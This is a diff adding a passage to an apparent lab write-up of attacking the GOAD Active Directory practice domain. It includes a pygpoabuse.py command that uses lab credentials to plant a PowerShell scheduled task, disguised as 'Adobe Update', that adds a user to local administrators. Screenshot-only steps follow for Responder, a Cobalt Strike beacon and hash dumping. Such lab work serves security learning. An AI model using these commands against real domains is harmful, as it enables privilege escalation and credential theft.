@@ -268,6 +268,50 @@ SEVENKINGDOMS$:des-cbc-md5:5864a2130462a77f
 [*] Cleaning up... 
 [*] Stopping service RemoteRegistry
 ```
+Lets now check that bloodhound data:
+
+<img width="705" height="566" alt="image" src="https://github.com/user-attachments/assets/6466de51-1cb0-4e0a-85f3-d104a2e95036" />
+
+```
+python3 pygpoabuse.py north.sevenkingdoms.local/samwell.tarly:Heartsbane -gpo-id 4FD8F4D4-A4CD-41DD-8F1C-643D0A4FF62A \
+-powershell \
+-command 'net localgroup administrators /add samwell.tarly' \
+-description 'Adobe Update' \
+-user
+```
+
+<img width="1263" height="181" alt="image" src="https://github.com/user-attachments/assets/38344288-e217-40ab-8855-fe307316c615" />
+
+Now wait a few minutes for the scheduled task to run
+
+<img width="1518" height="286" alt="image" src="https://github.com/user-attachments/assets/1b3169b9-9a63-4ffd-b3e4-40b4fa43fc45" />
+
+## WINTERFELL HAS FALLEN
+
+# WINTERFELL WITH COBALT STRIKE
+
+I reverted the machine to a snapshot I had
+
+We did "responder" again and crack robb.stark password. Beacon below is an http beacon
+
+<img width="898" height="91" alt="image" src="https://github.com/user-attachments/assets/2e91dc2d-1a37-4fcb-bdc3-e0303e075563" />
+
+<img width="364" height="141" alt="image" src="https://github.com/user-attachments/assets/b89dfbcc-9366-4f5e-b728-ff3660726066" />
+
+Dump Hashes
+
+<img width="756" height="448" alt="image" src="https://github.com/user-attachments/assets/9c893d32-35a0-4440-bf05-74b0526d2d5e" />
+
+Now that we have all the hashes for the machine we can continue on:
+
+
+
+
+
+
+
+
+
 
 
 
